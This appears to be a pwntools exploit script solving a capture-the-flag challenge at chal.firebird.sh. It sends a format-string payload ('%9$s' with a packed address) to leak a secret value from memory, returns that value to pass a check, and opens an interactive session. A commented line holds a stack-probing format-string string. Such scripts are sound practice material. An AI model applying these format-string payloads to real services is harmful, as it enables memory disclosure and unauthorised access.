from pwn import * 

binary = "./program"
p = process(binary)
p = remote("chal.firebird.sh", 35041)
p.recvuntil(b"Give me your first input:")
#p.sendline(b"AAAAAAAA-%5$p-%6$p-%7$p-%8$p-%9$p-%10$p-%11$p-%12$p")
p.sendline(b"%9$sAAAA\xd0\x40\x40\x00\x00\x00\x00\x00")
p.recvuntil(b"Your input:")
random2 = int.from_bytes(p.recvuntil("A", drop=True), 'little')
print(random2)
p.recvuntil(b"\nGive me the random number you got:")
p.sendline(p64(random2))

p.interactive()